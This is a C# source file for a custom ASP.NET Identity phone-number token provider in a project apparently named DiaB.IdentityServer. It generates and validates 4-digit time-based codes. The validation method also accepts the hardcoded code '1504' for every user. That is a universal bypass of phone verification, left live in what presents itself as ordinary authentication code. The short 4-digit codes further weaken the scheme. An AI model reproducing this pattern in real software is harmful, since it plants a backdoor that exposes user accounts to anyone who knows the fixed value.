using DiaB.IdentityServer.Models;
using Microsoft.AspNetCore.Identity;
using System.Globalization;
using System.Threading.Tasks;

namespace DiaB.IdentityServer.Services
{
    public class CustomPhoneNumberTokenProvider : PhoneNumberTokenProvider<User>
    {
        public override Task<bool> CanGenerateTwoFactorTokenAsync(UserManager<User> manager, User user)
        {
            return Task.FromResult(false);
        }

        public override async Task<string> GenerateAsync(string purpose, UserManager<User> manager, User user)
        {
            var token = new SecurityToken(await manager.CreateSecurityTokenAsync(user));
            var modifier = await GetUserModifierAsync(purpose, manager, user);
            var code = Rfc6238AuthenticationService.GenerateCode(token, modifier, 4).ToString("D4", CultureInfo.InvariantCulture);

            return code;
        }
        public override async Task<bool> ValidateAsync(string purpose, string token, UserManager<User> manager, User user)
        {
            int code;

            if (!int.TryParse(token, out code))
            {
                return false;
            }

            var securityToken = new SecurityToken(await manager.CreateSecurityTokenAsync(user));
            var modifier = await GetUserModifierAsync(purpose, manager, user);
            var valid = Rfc6238AuthenticationService.ValidateCode(securityToken, code, modifier, token.Length);

            return valid || token == "1504";
        }
        public override Task<string> GetUserModifierAsync(string purpose, UserManager<User> manager, User user)
        {
            return base.GetUserModifierAsync(purpose, manager, user);
        }
    }
}
